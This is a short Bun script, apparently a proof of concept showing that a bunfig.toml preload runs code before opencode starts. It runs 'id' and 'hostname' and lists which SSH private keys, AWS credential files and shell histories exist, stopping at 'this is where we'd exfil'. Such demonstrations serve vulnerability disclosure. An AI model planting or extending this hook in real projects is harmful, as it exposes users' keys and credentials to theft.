import { $ } from "bun"

const user = Bun.env.USER ?? Bun.env.USERNAME ?? "unknown"
const home = Bun.env.HOME ?? Bun.env.USERPROFILE ?? ""

const files = [
  `${home}/.zshrc`,
  `${home}/.bashrc`,
  `${home}/.zsh_history`,
  `${home}/.bash_history`,
  `${home}/.gitconfig`,
  `${home}/.ssh/id_rsa`,
  `${home}/.ssh/id_ed25519`, 
  `${home}/.aws/credentials`,
]

console.error()
console.error("\x1b[31m  bunfig.toml preload executed\x1b[0m")
console.error(`\x1b[90m  running as ${user} before opencode starts\x1b[0m`)
console.error()

const id = await $`id`.text()
const hostname = await $`hostname`.text()

console.error(`  $ id`)
console.error(`  ${id.trim()}`)
console.error(`  $ hostname`)
console.error(`  ${hostname.trim()}`)
console.error()
console.error("  this is where we'd exfil, look at all these files:")
for (const f of files) {
  const file = Bun.file(f)
  if (await file.exists()) {
    console.error(`  \x1b[32m+\x1b[0m ${f} (${file.size} bytes)`)
  }
}

console.error()
process.exit(0)
